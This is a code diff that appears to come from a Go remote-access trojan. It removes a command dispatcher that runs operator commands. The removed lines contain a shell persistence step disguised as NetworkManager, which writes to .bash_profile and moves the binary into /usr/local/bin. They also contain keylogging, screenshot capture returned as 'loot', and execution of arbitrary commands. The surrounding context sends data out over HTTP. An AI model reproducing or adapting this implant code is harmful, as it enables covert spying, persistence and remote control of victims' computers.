@@ -6,7 +6,6 @@ import (
 	"math/rand/v2"
 	"net/http"
 	"os"
-	"strconv"
 	"strings"
 	"time"
 
@@ -109,41 +108,4 @@ func readKeys(request http.Request) {
 			http.DefaultClient.Do(&request)
 		}
 	}
-}
-
-func runCommand(command []string) Loot {
-	logger.Debug("Executing command: " + command[0])
-
-	var loot Loot
-	switch command[0] {
-	case "INJECT":
-		const injectCommand string = "echo '/usr/local/bin/NetworkManager' >> /home/$(whoami)/.bash_profile; mv ./NetworkManager /usr/local/bin/NetworkManager"
-		loot.Content = ExecuteCommand([]string{injectCommand})
-	case "SESSION":
-		go JoinSession()
-	case "INTERVAL":
-		if len(command) > 1 {
-			interval, err := strconv.Atoi(command[1])
-			if err == nil {
-				config.Interval = interval
-			}
-		}
-	case "LOGKEYS":
-		state.IsLoggingKeys = true
-		go LogKeyboard()
-	case "STOP-LOGKEYS":
-		state.IsLoggingKeys = false
-		// TODO: Signal go routine to stop
-	case "SCREEN":
-		screenshots := CaptureScreen()
-		loot.Kind = "Image"
-		// TODO: Send more than 1 screenshot for multiple monitor setups
-		loot.Content = screenshots[0]
-	default:
-		loot.Content = ExecuteCommand(command)
-		logger.Debug("Output:\n" + loot.Content)
-	}
-	logger.Info("Executed command")
-
-	return loot
 }
